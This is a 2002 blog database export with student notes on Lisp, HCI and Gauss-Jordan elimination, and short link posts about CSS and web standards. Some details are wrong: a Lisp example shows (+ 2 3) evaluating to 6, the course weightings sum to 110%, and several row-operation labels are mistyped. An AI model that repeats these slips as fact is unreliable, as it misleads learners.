		<field name="body">&lt;h3&gt;Functional Programming&lt;/h3&gt;

&lt;p&gt;These notes cover the first two lectures of Dr Bradford's Function Programming course.&lt;/p&gt;

&lt;p&gt;This course is about the gapp between computer science theory and practise. It consists of a written exam (75%) mainly on Lambda calculus and coursework (35%) written in Lisp.&lt;/p&gt;

&lt;p&gt;The three themes of the course are:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Practise - programming in Lisp&lt;/li&gt;
&lt;li&gt;Theory - a formal theory of computation&lt;/li&gt;
&lt;li&gt;Link - how theory and practise influence each other&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;There are several styles of programming:&lt;/p&gt;

&lt;dl&gt;
&lt;dt&gt;Unstructured&lt;/dt&gt;

&lt;dd&gt;deals with manipulating bytes (e.g Assembler)&lt;/dd&gt;
&lt;dt&gt;Procedural&lt;/dt&gt;
&lt;dd&gt;based around control structures and functions (C-Like, e.g Pascal and Algol)&lt;/dd&gt;
&lt;dt&gt;Object-Oriented&lt;/dt&gt;
&lt;dd&gt;helps represent ideas, for when programs get too big for procedural languages to stay effective (Java, C++, etc)&lt;/dd&gt;
&lt;dt&gt;Declarative&lt;/dt&gt;
&lt;dd&gt;Prolog&lt;/dd&gt;
&lt;dt&gt;Functional&lt;/dt&gt;
&lt;dd&gt;Lisp-like languages, the topic of this course&lt;/dd&gt;

&lt;/dl&gt;

&lt;p&gt;In functional programming, one of the key concepts is that variables are kept as local as possible. This means that functional code should be easy to quickly understand as sections of the code are self contained.&lt;/p&gt;

&lt;h4&gt;Links&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://www.bath.ac.uk/~masrjb/CourseNotes/cm20167.html&quot;&gt;Course notes&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.bath.ac.uk/~masrjb/Sources/eunotes.html&quot;&gt;Notes on EU Lisp&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.bath.ac.uk/~masjap/TYL/&quot;&gt;Teach Yourself Lisp&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h4&gt;Books&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;Barendregt &lt;cite&gt;&quot;The Lambda Calculus&quot;&lt;/cite&gt; - a comprehensive guide to Lambda calculus, very hard going&lt;/li&gt;
&lt;li&gt;Hindley and Selddin &lt;cite&gt;&quot;Introduction to Combinators and Lambda Calculus&quot;&lt;/cite&gt; - more readable than the above&lt;/li&gt;
&lt;li&gt;Abelson and Sussman &lt;cite&gt;&quot;The Structure and Interpretation of Computer Programs&quot;&lt;/cite&gt; - good as a general computer science text book, concentrates on Scheme as the example programming language.&lt;/li&gt;

&lt;/ul&gt;

&lt;h3&gt;Lisp&lt;/h3&gt;

&lt;p&gt;Lisp means &quot;List Processor&quot;. It was invented in 1956 by John McCarthy with the aim of providing a computerised implementation of Lambda calculus, a formal theory of computation devised in the 1920s. Lambda calculus and Lisp are very heavily related. Lisp was invented as a language for manipulating symbols rather than numbers. A &lt;dfn&gt;symbol&lt;/dfn&gt; has no meaningful value (unlike numbers which have an inherent meaning).&lt;/p&gt;

&lt;p&gt;Lisp is designed to deal with dynamic data structures. Unlike languages such as C and Java, a list in Lisp can have items appended to it and deleted from it throughout the life of the program without any need for memory allocation code. Lisp implements garbage collection and memory management. It is a &lt;dfn&gt;dynamically efficient&lt;/dfn&gt; language, specially designed to handle dynamic data structures.&lt;/p&gt;

&lt;p&gt;Lisp is &lt;dfn&gt;naturally recursive&lt;/dfn&gt; - many problems in Lisp are solved using recursion, which is also an important aspect of lambda calculus (where many things are defined in terms of themselves).&lt;/p&gt;

&lt;p&gt;Lisp has a very simple syntax, and is a very simple language. This was important back in the 50s when super computers were less powerful than a modern singing Christmas card.&lt;/p&gt;

&lt;p&gt;In Lisp, the data and the programs look exactly the same. This is another similarity with lambda calculus where no distrinction is made between the two. This also means that a Lisp interpreter can be written in Lisp.&lt;/p&gt;

&lt;h4&gt;The History of Lisp&lt;/h4&gt;

&lt;p&gt;Lisp has a long and complicated history, dating back to the first released version (1.0) in 1959. There are hundreds of versions of Lisp now with many small but significant incompatabilities between versions. Some versions were designed for speed while others were designed for semantic purity. Several attempts have been made to standardise Lisp, including Standard Lisp and Common Lisp.&lt;/p&gt;

&lt;dl&gt;
&lt;dt&gt;Common Lisp&lt;/dt&gt;
&lt;dd&gt;Took the best bits of many Lisp versions, resulting in a truly huge and complicated language with a lot of confusing features.&lt;/dd&gt;
&lt;dt&gt;Standard Lisp&lt;/dt&gt;
&lt;dd&gt;Took the features that were common to most Lisp implementations, resulting in a much simpler language.&lt;/dd&gt;
&lt;/dl&gt;

&lt;p&gt;Another important Lisp variant is &lt;dfn&gt;Scheme&lt;/dfn&gt;, which threw away everything non-essential in the many Lisp variants and resulted in a cut-down language with a very mathematical approach. Scheme is a very pure and interesting language (at least for Computer Scientists) but some people object to Scheme being labelled a Lisp and see it as a new language inspired by Lisp.&lt;/p&gt;

&lt;p&gt;&lt;dfn&gt;EuLisp&lt;/dfn&gt; is a version of Lisp sponsored by the European Commission in the 90s, partly for political reasons (the American's had Common Lisp) and partly because Common Lisp was a huge sprawling specification while Scheme was so heavily regulated that adding new functions was an almost impossible process. EuLisp was developed (at least in part) by professors now at the University of Bath. It was originally intended to take the position in the market now held by Java but suffered political set backs and never reached its full potential. There is currently a project to create an ISO standardised Lisp version (strongly backed by the Japanese) which has yet to have any impact on the computer science industry.&lt;/p&gt;

&lt;p&gt;Conclusion: Lisp is &lt;em&gt;not a single language&lt;/em&gt; - it is a whole family of languages.&lt;/p&gt;

&lt;h4&gt;Lisp Syntax&lt;/h4&gt;

&lt;p&gt;The basic data structure in Lisp is the &lt;dfn&gt;list&lt;/dfn&gt;, which is a sequence of objects. Objects can be atoms or other lists. An &lt;dfn&gt;atom&lt;/dfn&gt; is an object in Lisp that is not a list and is generally indivisible.&lt;/p&gt;

&lt;pre&gt;
(the cat sat (on the) mat)
&lt;/pre&gt;

&lt;p&gt;The above is an example of list syntax in Lisp. The list consists of 5 elements, 4 of which are symbols and one of which is another list itself containing 2 symbols. Symbols are separated by spaces, and lists are deliminated by normal parentheses.&lt;/p&gt;

&lt;p&gt;Numbers are not symbols. The following list consists of 3 integers.&lt;/p&gt;

&lt;pre&gt;
(1 3 4)
&lt;/pre&gt;

&lt;p&gt;Lists can be arbitrarily nested. The empty list, &lt;code&gt;()&lt;/code&gt; is usually made available by the interpreter in a variable called &lt;code&gt;nil&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Lisp can be compiled and executed in the same way as C, but it can also be used as an interactive interpreter which runs in a read-&amp;gt;eval-&amp;gt;print loop:&lt;/p&gt;

&lt;pre&gt;
&amp;gt; (+ 2 3)
6
&amp;gt;
&lt;/pre&gt;

&lt;p&gt;To get Lisp to execute a statement, the statement must be entered as a list. The first element in the list is a function (or more commonly a variable containing a function, as in the above example where the &lt;code&gt;+&lt;/code&gt; symbol contains the function for addition) while the other elements represent the arguments to that function. The addition function demonstrated above accepts two or more arguments in EuLisp, but in other Lisp variants may only accept exactly two arguments (or even be called something different such as &lt;code&gt;plus&lt;/code&gt;).&lt;/p&gt;

&lt;p&gt;Generally, a function call looks like this: &lt;code&gt;(function arg arg ....)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;There are a very few cases when you will not write Lisp code in the above form - an atom can be written on its own, as can a number (which will stand for its own value). The only time an atom does not stand for itself is when it is a variable.&lt;/p&gt;

&lt;p&gt;If a variable has no value and you ask for one you will get an error. In Lisp, even errors are objects (data structures) that can be manipulated.&lt;/p&gt;

&lt;p&gt;Essentially, the only difference between data and a Lisp program is what you do with it.&lt;/p&gt;

&lt;p&gt;There are several special Lisp forms. The most important is &lt;dfn&gt;quote&lt;/dfn&gt;, which allows a Lisp programmer to specify that a list is meant to be used as data rather than executed as code. The quote function returns its arguments unchanged and unevaluated:&lt;/p&gt;

&lt;pre&gt;
&amp;gt; (quote (+ 1 2))
(+ 1 2)
&amp;gt;
&lt;/pre&gt;

&lt;p&gt;A shorthand way of writing the above statement is to use a single apostrophe: &lt;code&gt;'(+ 1 2)&lt;/code&gt; which is the exact equivalent of the above statement.&lt;/p&gt;</field>
		<field name="created">2002-09-27 16:49:14</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">452</field>
		<field name="title">Usability and interface design</field>
		<field name="slug">usabilityAndInterfaceDesign</field>
		<field name="body">&lt;h3&gt;Graphical User Interfaces&lt;/h3&gt;

&lt;p&gt;This course covers &lt;acronym title=&quot;Human Computer Interaction&quot;&gt;HCI&lt;/acronym&gt; with a heavy emphasis on implementation. We will be developing the interface/interaction components of software using Java, in particular the &lt;acronym title=&quot;Abstract Windowing Toolkit&quot;&gt;AWT&lt;/acronym&gt; and Swing toolkits.&lt;/p&gt;

&lt;p&gt;The course will consist of one piece of group coursework and one exam. The coursework will last from week 3 to week 10 of the course.&lt;/p&gt;

&lt;p&gt;Swing is &lt;em&gt;huge&lt;/em&gt;. No one can be expected to know all of Swing, but we will need to be able to use the library documentation to find the classes we need when we need to use them.&lt;/p&gt;

&lt;h4&gt;Usability&lt;/h4&gt;

&lt;p&gt;Usability &lt;em&gt;is&lt;/em&gt; functionality. If a user can not use a feature the feature may as well not exist. Usability can be measured through evaluation, which differs from testing in that testing checks that the sofware does what the developer intended while evaluation checks that the software does what the &lt;em&gt;user&lt;/em&gt; wants it to do.&lt;/p&gt;

&lt;p&gt;How do we get usability? We build it in from the start. Designing for usability is a key part of the development process. It can not be tacked on at the end.&lt;/p&gt;

&lt;p&gt;There are four design methodologies that relate to usability:&lt;/p&gt;

&lt;dl&gt;
&lt;dt&gt;User centered design&lt;/dt&gt;
&lt;dd&gt;The design takes in to account data gathered from the end users of the system.&lt;/dd&gt;
&lt;dt&gt;Particapatory design&lt;/dt&gt;
&lt;dd&gt;Similar to user centered design, but the users are actively involved in the design process. This technique was developed in Scandinavia in the early 80s thanks to a Norwegian law which required the workers (through their trade unions) to approve any software being introduced in to the work place.&lt;/dd&gt;
&lt;dt&gt;Experimental design&lt;/dt&gt;
&lt;dd&gt;?&lt;/dd&gt;
&lt;dt&gt;Iterative design&lt;/dt&gt;
&lt;dd&gt;The initial design is evolved and improved over many iterations&lt;/dd&gt;
&lt;/dl&gt;

&lt;p&gt;HCI is a multi-disciplinary activity. It involves more than just designing software, and ends up being part management consultancy, part anthropolgy and part code hacking.&lt;/p&gt;

&lt;p&gt;The usability trinity is:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Users&lt;/li&gt;
&lt;li&gt;Task&lt;/li&gt;
&lt;li&gt;Environment&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Task-based design activities include collecting information on the tasks that users will be completing using the software.&lt;/p&gt;

&lt;p&gt;Another way of looking at the usability design process is the following:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Understand how the user's tasks work at the moment&lt;/li&gt;
&lt;li&gt;Think how these tasks could be done better. If the organisation needs software it means that their current working practises are inefficient, so it would not be a good idea to build a system to support their current practises without first considering their weaknesses. The model you come up with is called the &lt;dfn&gt;envision task model&lt;/dfn&gt;.&lt;/li&gt;
&lt;li&gt;Build the software to support your model.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;People do not like being told to change their working practises, so usability engineering using the above method can be very difficult.&lt;/p&gt;</field>
		<field name="created">2002-09-27 17:08:22</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">453</field>
		<field name="title">XFML 1.0 soon</field>
		<field name="slug">xfml1soon</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://poorbuthappy.com/ease/000418.html&quot;&gt;Peter Van Dijck&lt;/a&gt;: &lt;q cite=&quot;http://poorbuthappy.com/ease/000418.html&quot;&gt;Future XFML news will be posted on the &lt;a href=&quot;http://xfml.org/&quot;&gt;XFML.org&lt;/a&gt; site.&lt;/q&gt; &lt;acronym title=&quot;eXchangable Faceted Metadata Language&quot;&gt;XFML&lt;/acronym&gt; 1.0 will be with us soon.&lt;/p&gt;</field>
		<field name="created">2002-09-27 17:12:23</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">454</field>
		<field name="title">Peter Gabriel</field>
		<field name="slug">peterGabriel</field>
		<field name="body">&lt;p&gt;Today's weird blogging observation: Bloggers &lt;em&gt;love&lt;/em&gt; Peter Gabriel. Jeremy Zawodny is a &lt;a href=&quot;http://jeremy.zawodny.com/blog/archives/000200.html#000200&quot; title=&quot;Early Start and Peter Gabriel&quot;&gt;big fan&lt;/a&gt;, Scott Andrew &lt;a href=&quot;http://www.scottandrew.com/weblog/2002_09#a000422&quot; title=&quot;That Voice Again&quot;&gt;can't wait&lt;/a&gt; for his new album, Jeffrey Zeldman &lt;a href=&quot;http://www.zeldman.com/daily/0902a.html#bridges&quot;&gt;praises&lt;/a&gt; his sophistication and daypop &lt;a href=&quot;http://www.daypop.com/search?q=peter+gabriel&amp;amp;t=w&quot; title=&quot;Daypop Weblogs search for &amp;quot;Peter Gabriel&amp;quot;&quot;&gt;returns&lt;/a&gt; 44 blogs currently talking about him. Despite being good friends with his nephew I've never really listened to him that much, but with glowing reviews such as these I'm tempted to grab the new album and see what the fuss is about.&lt;/p&gt;</field>
		<field name="created">2002-09-30 11:40:23</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">455</field>
		<field name="title">CSS in the real world</field>
		<field name="slug">cssInTheRealWorld</field>
		<field name="body">&lt;p&gt;Adrian Holovaty: &lt;a href=&quot;http://www.holovaty.com/blog/archive/2002/09/28/2340&quot;&gt;CSS in the real world&lt;/a&gt;. Adrian uses &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; to reduce the markup for a list of news headlines by 75%:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.holovaty.com/blog/archive/2002/09/28/2340&quot;&gt;&lt;p&gt;Which code would you rather work in when there are four breaking news stories on the wire simultaneously and millions of readers are flooding your site, expecting up-to-the-minute updates?&lt;/p&gt;&lt;/blockquote&gt;</field>
		<field name="created">2002-09-30 12:27:52</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">456</field>
		<field name="title">Taming lists</field>
		<field name="slug">tamingLists</field>
		<field name="body">&lt;p&gt;In &lt;a href=&quot;http://www.alistapart.com/stories/taminglists/&quot;&gt;CSS Design: Taming Lists&lt;/a&gt;, Mark Newhouse explains in detail every CSS list trick in the book, including inline lists, nested breadcrumbs and a variety of other useful techniques. He also links to Eric Meyer's essential DevEdge article &lt;a href=&quot;http://devedge.netscape.com/viewsource/2002/list-indent/&quot;&gt;Consistent List Indentation&lt;/a&gt; which explains how to deal with the differences between list indentation in Internet Explorer and Mozilla.&lt;/p&gt;</field>
		<field name="created">2002-09-30 12:44:36</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">457</field>
		<field name="title">Utter muppets</field>
		<field name="slug">utterMuppets</field>
		<field name="body">&lt;p&gt;KPMG.com &lt;em&gt;still&lt;/em&gt; &lt;a href=&quot;http://www.kpmg.com/&quot;&gt;sucks&lt;/a&gt; in Mozilla.&lt;/p&gt;</field>
		<field name="created">2002-09-30 12:46:19</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">458</field>
		<field name="title">XML transformations with CSS and the DOM</field>
		<field name="slug">xmlTransformationsWithCSSandTh</field>
		<field name="body">&lt;p&gt;Scott Andrew: &lt;a href=&quot;http://developer.apple.com/internet/css/xmltransformations.html&quot;&gt;XML Transformations with CSS and DOM&lt;/a&gt;. Forget about &lt;acronym title=&quot;XML Stylesheet Language Transformations&quot;&gt;XSLT&lt;/acronym&gt;, Scott demonstrates how CSS can be used to visually style XML documents while a bit of Javascript can add additional behaviour such as clickable links. Unfortunately the &lt;a href=&quot;http://www.scottandrew.com/pub/xml/index.xml&quot;&gt;demonstration document&lt;/a&gt; doesn't seem to work in my 1.1 version of Mozilla (the styles work fine but the clickable links don't work at all).&lt;/p&gt;</field>
		<field name="created">2002-09-30 13:04:19</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">459</field>
		<field name="title">Pingback and Trackback</field>
		<field name="slug">pingbackAndTrackback</field>
		<field name="body">&lt;p&gt;Hixie has written &lt;a href=&quot;http://ln.hixie.ch/?start=1033171507&amp;amp;count=1&quot; title=&quot;Whitepaper: Pingback vs Trackback&quot;&gt;a whitepaper&lt;/a&gt; comparing Pingback to Trackback, and answering pretty much every question that has been asked about Pingback in the past week.&lt;/p&gt;</field>
		<field name="created">2002-09-30 13:16:54</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">460</field>
		<field name="title">Maths for apps problems class</field>
		<field name="slug">mathsForAppsProblemsClass</field>
		<field name="body">&lt;h3&gt;Maths for Applications Problem Class (27th September 2002)&lt;/h3&gt;

&lt;h4&gt;Theorems&lt;/h4&gt;

&lt;p&gt;I didn't quite understand this part of the lecture as we arrived late. These are the notes copied from the board.&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;The elementary transformations (elementary row operations) are reversible&lt;/li&gt;
&lt;li&gt;The elementary transformations leave the solution set invariant&lt;/li&gt;
&lt;/ol&gt;

&lt;h4&gt;Proof of 2&lt;/h4&gt;

&lt;p&gt;If S is a system of equations, let Sol(S) be the set of solutions. Suppose S&lt;sub&gt;1&lt;/sub&gt; =&amp;gt; S&lt;sub&gt;2&lt;/sub&gt; by one elementary transformation and α ∈ Sol(S&lt;sub&gt;1&lt;/sub&gt;). Thanks to the rule of interchange that states that two equations (or rows of the matrix) can be exchanged α ∈ Sol(S&lt;sub&gt;2&lt;/sub&gt;)&lt;/p&gt;

&lt;p&gt;E&lt;sub&gt;i&lt;/sub&gt; := CE&lt;sub&gt;i&lt;/sub&gt;, C != 0 then α ∈ Sol(S&lt;sub&gt;2&lt;/sub&gt;)&lt;/p&gt;

&lt;p&gt;If S&lt;sub&gt;1&lt;/sub&gt; =&amp;gt; S&lt;sub&gt;2&lt;/sub&gt; by E&lt;sub&gt;i&lt;/sub&gt; := E&lt;sub&gt;i&lt;/sub&gt; + CE&lt;sub&gt;j&lt;/sub&gt; then α ∈ Sol(S&lt;sub&gt;2&lt;/sub&gt;)&lt;/p&gt;

&lt;p&gt;In all cases we have α ∈ Sol(S&lt;sub&gt;1&lt;/sub&gt;) -&amp;gt; α ∈ Sol(S&lt;sub&gt;2&lt;/sub&gt;)&lt;/p&gt;

&lt;p&gt;Thus we get Sol(S&lt;sub&gt;1&lt;/sub&gt;) &lt;span style=&quot;text-decoration: underline&quot;&gt;c&lt;/span&gt; Sol(S&lt;sub&gt;2&lt;/sub&gt;)&lt;/p&gt;

&lt;p&gt;By part 1, S&lt;sub&gt;2&lt;/sub&gt; =&amp;gt; S&lt;sub&gt;1&lt;/sub&gt; thus Sol(S&lt;sub&gt;1&lt;/sub&gt;) &lt;span style=&quot;text-decoration: underline&quot;&gt;c&lt;/span&gt; Sol(S&lt;sub&gt;2&lt;/sub&gt;)&lt;/p&gt;

&lt;hr /&gt;

&lt;h4&gt;Solving systems of linear equations&lt;/h4&gt;

&lt;p&gt;Systems of linear equations can be solved by creating an augmented matrix to represent the system and manipulating it using elementary row operations. The method described here is called &lt;dfn&gt;Gauss Jordan Elimination&lt;/dfn&gt;.&lt;/p&gt;

&lt;pre&gt;
                      Augmented Matrix
x&lt;sub&gt;1&lt;/sub&gt;  + x&lt;sub&gt;2&lt;/sub&gt;  + x&lt;sub&gt;3&lt;/sub&gt; = 2    [ 1   1   1   2 ]
2x&lt;sub&gt;1&lt;/sub&gt; + 3x&lt;sub&gt;2&lt;/sub&gt; + x&lt;sub&gt;3&lt;/sub&gt; = 3    [ 2   3   1   3 ]
x&lt;sub&gt;1&lt;/sub&gt;  - x&lt;sub&gt;2&lt;/sub&gt;  - 2&lt;sub&gt;3&lt;/sub&gt; = 6    [ 1  -1  -2   6 ]
&lt;/pre&gt;

&lt;p&gt;The basic idea here is to use E&lt;sub&gt;1&lt;/sub&gt; (equation 1) to eliminate x&lt;sub&gt;1&lt;/sub&gt; from E&lt;sub&gt;2&lt;/sub&gt; and E&lt;sub&gt;3&lt;/sub&gt;, then use E&lt;sub&gt;2&lt;/sub&gt; to eliminate x&lt;sub&gt;2&lt;/sub&gt; from E&lt;sub&gt;1&lt;/sub&gt; and E&lt;sub&gt;3&lt;/sub&gt;.&lt;/p&gt;

&lt;p&gt;First we take twice the first row away from the second, then take the first row away from the third.&lt;/p&gt;

&lt;pre&gt;
[ 1   1   1   2 ]     [ 1   1   1   2 ]
[ 2   3   1   3 ] =&amp;gt;* [ 0   1  -1  -1 ]    row 2 := row 2 - 2 x row 1
[ 1  -1  -2   6 ]     [ 0  -2  -3   4 ]    row 3 := row 2 - row 1
&lt;/pre&gt;

&lt;p&gt;We have carried out two row operations and eliminated x&lt;sub&gt;1&lt;/sub&gt; from rows 2 and 3. We will now repeat this process but with the aim of eliminating x&lt;sub&gt;2&lt;/sub&gt; from all but row 2.&lt;/p&gt;

&lt;pre&gt;
[ 1   1   1   2 ]    [ 1   0   2   3 ]   row 1 := row 1 - row 2
[ 0   1  -1  -1 ] =&amp;gt; [ 0   1  -1  -1 ]
[ 0  -2  -3   4 ]    [ 0   0  -5   2 ]   row 3 := row 2 + 2 x row 2
&lt;/pre&gt;

&lt;p&gt;The next step is to change the -5 in to a 1 using row 3 := row 3 / -5&lt;/p&gt;

&lt;pre&gt;
[ 1   0   2   3 ]    [ 1   0   2   3   ]
[ 0   1  -1  -1 ] =&amp;gt; [ 0   1  -1  -1   ]
[ 0   0  -5   2 ]    [ 0   0   1  -2/5 ]
&lt;/pre&gt;

&lt;p&gt;Now we clean up the third column with another pair of row operations:&lt;/p&gt;

&lt;pre&gt;
[ 1   0   2   3   ]     [ 1   0   0   19/5 ]  row 1 := row 1 - 2 x row 3
[ 0   1  -1  -1   ] =&amp;gt;* [ 0   1   0   -7/5 ]  row 2 := row 2 + row 3
[ 0   0   1  -2/5 ]     [ 0   0   1   -2/5 ]
&lt;/pre&gt;

&lt;p&gt;Note that this final matrix has the identity matrix on the right. This matrix is in &lt;em&gt;Reduced Echelon Form&lt;/em&gt;. The presence of the identity matrix shows us that there is a single unique solution to the system of equations. We can read the results off by looking at the columns and rows (remember that the first column is x&lt;sub&gt;1&lt;/sub&gt;, the second is x&lt;sub&gt;2&lt;/sub&gt; and the third is x&lt;sub&gt;3&lt;/sub&gt;. From this we can deduce the following results:&lt;/p&gt;

&lt;pre&gt;
x&lt;sub&gt;1&lt;/sub&gt; = 19/5
x&lt;sub&gt;2&lt;/sub&gt; = -7/5
x&lt;sub&gt;3&lt;/sub&gt; = -2/5
&lt;/pre&gt;

&lt;hr /&gt;

&lt;p&gt;The system of equations:&lt;/p&gt;

&lt;pre&gt;
a&lt;sub&gt;11&lt;/sub&gt;x&lt;sub&gt;1&lt;/sub&gt; + ... + a&lt;sub&gt;1m&lt;/sub&gt;x&lt;sub&gt;m&lt;/sub&gt; = b&lt;sub&gt;1&lt;/sub&gt;
  .
  .
  .
a&lt;sub&gt;n1&lt;/sub&gt;x&lt;sub&gt;n&lt;/sub&gt; + ... + a&lt;sub&gt;nm&lt;/sub&gt;x&lt;sub&gt;m&lt;/sub&gt; = b&lt;sub&gt;n&lt;/sub&gt;
&lt;/pre&gt;

&lt;p&gt;has a coefficient matrix like this:&lt;/p&gt;

&lt;pre&gt;
[ a&lt;sub&gt;11&lt;/sub&gt; ... a&lt;sub&gt;1m&lt;/sub&gt; ]                     [ a&lt;sub&gt;11&lt;/sub&gt; ... a&lt;sub&gt;1m&lt;/sub&gt;   b&lt;sub&gt;1&lt;/sub&gt; ]
[   .        ]   and an augmented   [   .             ]
[   .        ]   matrix like this   [   .             ]
[   .        ]                      [   .             ]
[ a&lt;sub&gt;n1&lt;/sub&gt; ... a&lt;sub&gt;nm&lt;/sub&gt; ]                     [ a&lt;sub&gt;n1&lt;/sub&gt; ... a&lt;sub&gt;nm&lt;/sub&gt;   b&lt;sub&gt;n&lt;/sub&gt; ]
&lt;/pre&gt;

&lt;p&gt;A matrix is in &lt;dfn&gt;Reduced Echelon Form&lt;/dfn&gt; if:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Any rows consisting entirely of zeros are grouped at the bottom of the matrix.&lt;/li&gt;
&lt;li&gt;The first non-zero element of any row is a 1 (apart from all-zero rows). This element is called a &lt;dfn&gt;Leading 1&lt;/dfn&gt;.&lt;/li&gt;
&lt;li&gt;The leading 1 of each row after the first is to the right of the leading 1 of the previous row (this is the &lt;em&gt;echelon&lt;/em&gt; part of the name).&lt;/li&gt;
&lt;li&gt;All other elements in a column that contains a leading 1 are 0 (this is the &lt;em&gt;reduced&lt;/em&gt; idea).&lt;/li&gt;
&lt;/ol&gt;

&lt;h4&gt;Example Matrices&lt;/h4&gt;

&lt;p&gt;The following matrices are not in reduced echelon form:&lt;/p&gt;

&lt;pre&gt;
[ 2   0   0   1 ]    [ 0   0   0 ]    [ 0   1   0 ]
[ 0   1   0   0 ]    [ 1   0   0 ]    [ 1   0   0 ]
[ 0   0   0   0 ]
&lt;/pre&gt;

&lt;p&gt;These matrices &lt;em&gt;are&lt;/em&gt; in reduced echelon form:&lt;/p&gt;

&lt;pre&gt;
a) [ 1   0   0 ]   b) [ 0   1   0   0 ]   c) [ 1   0   0   0 ]
   [ 0   0   1 ]      [ 0   0   1   2 ]      [ 0   0   1   0 ]
   [ 0   0   0 ]                             [ 0   0   0   1 ]

d) [ 1   0   0   0 ]   e) [ 1   0   8 ]
   [ 0   0   1   0 ]      [ 0   1  12 ]
   [ 0   0   0   1 ]
&lt;/pre&gt;

&lt;p&gt;It is &lt;em&gt;easy&lt;/em&gt; to solve a system of equations if its augmented matrix is in reduced echelon form. Here's how to do it with the labelled examples above:&lt;/p&gt;

&lt;pre&gt;
a) x&lt;sub&gt;1&lt;/sub&gt; + 0x&lt;sub&gt;2&lt;/sub&gt; = 0
   0x&lt;sub&gt;1&lt;/sub&gt; + 0x&lt;sub&gt;2&lt;/sub&gt; = 1
   0 != 1 so this system has no solution 

b) x&lt;sub&gt;2&lt;/sub&gt; = 0
   x&lt;sub&gt;3&lt;/sub&gt; = 2
   x&lt;sub&gt;1&lt;/sub&gt; = anything
   so this system has many solutions

c) The leading 1 in the last column shows this system has no solutions

d) The same as (c)

e) x&lt;sub&gt;1&lt;/sub&gt; = 8
   x&lt;sub&gt;2&lt;/sub&gt; = 12
   The identity matrix on the left shows this is a unique solution
&lt;/pre&gt;</field>
		<field name="created">2002-09-30 14:12:50</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">461</field>
		<field name="title">Aquarionics backups</field>
		<field name="slug">aquarionicsBackups</field>
		<field name="body">&lt;p&gt;Aquarion &lt;a href=&quot;http://www.aquarionics.com/index.php?id=750&quot; title=&quot;Backup&quot;&gt;explains&lt;/a&gt; how his automated backup scripts work.&lt;/p&gt;</field>
		<field name="created">2002-09-30 14:17:19</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">462</field>
		<field name="title">Managing data</field>
		<field name="slug">managingData</field>
		<field name="body">&lt;h3&gt;Managing Data&lt;/h3&gt;

&lt;p&gt;These notes cover chapter one of &quot;Data Management&quot; by Richard T. Watson.&lt;/p&gt;

&lt;p&gt;Organisations generate, store and process large amounts of data. &lt;dfn&gt;Data management&lt;/dfn&gt; is the management of this organisational memory.&lt;/p&gt;

&lt;p&gt;Individuals use data management techniques as well. Todo lists, calendars and address books are all examples of external memories (as opposed to our brain which is internal memory). These thre examples also share some common characteristics - they provide a standard format for storing specific kinds of information and they are organised in a way which accomodates rapid retrieval of information. They also requrie a trade-off between speed and size - a pocket calendar can not contain as much detailed information as a desk calendar but is far more conenient.&lt;/p&gt;

&lt;p&gt;Organisations use all kinds of methods for storing data - filing cabinets, notice boards, computer systems and people are all frequently used. Storage devices are organised for rapid data entry and retrieval. Various types of information systems can be used:&lt;/p&gt;

&lt;dl&gt;
&lt;dt&gt;Transaction processing system&lt;/dt&gt;
&lt;dd&gt;&lt;acronym title=&quot;Transaction processing system&quot;&gt;TPS&lt;/acronym&gt; - collects and stores data from routine transactions&lt;/dd&gt;
&lt;dt&gt;Management information system&lt;/dt&gt;
&lt;dd&gt;&lt;acronym title=&quot;Management information system&quot;&gt;MIS&lt;/acronym&gt; - converts data from a TPS in to information for managing an organisation&lt;/dd&gt;
&lt;dt&gt;Decision support system&lt;/dt&gt;
&lt;dd&gt;&lt;acronym title=&quot;Decision support system&quot;&gt;DSS&lt;/acronym&gt; - supports managerial decision making by provifing models for processing and analysing data&lt;/dd&gt;
&lt;dt&gt;Executive information system&lt;/dt&gt;
&lt;dd&gt;&lt;acronym title=&quot;Executive information system&quot; /&gt; - provides information helpful to senior management for strategic decision making and organisation performance monitoring&lt;/dd&gt;
&lt;dt&gt;On-line analytical processing&lt;/dt&gt;
&lt;dd&gt;&lt;acronym title=&quot;On-line analytical processing&quot;&gt;OLAP&lt;/acronym&gt; - presents multidimensional logical views of data&lt;/dd&gt;
&lt;dt&gt;Data Mining&lt;/dt&gt;
&lt;dd&gt;Uses statistical analysis to uncover hidden trends and relationships in data&lt;/dd&gt;
&lt;/dl&gt;

&lt;p&gt;Desirable atributes of data stored by an organisation include:&lt;/p&gt;

&lt;dl&gt;
&lt;dt&gt;Shareable&lt;/dt&gt;
&lt;dd&gt;The data can be accessed by more than one person at a time. Low-volatility data often has many copies printed and distributed, which can cause problems if changes are made.&lt;/dd&gt;
&lt;dt&gt;Transportable&lt;/dt&gt;
&lt;dd&gt;The data can easily be moved to the people who need to access it&lt;/dd&gt;
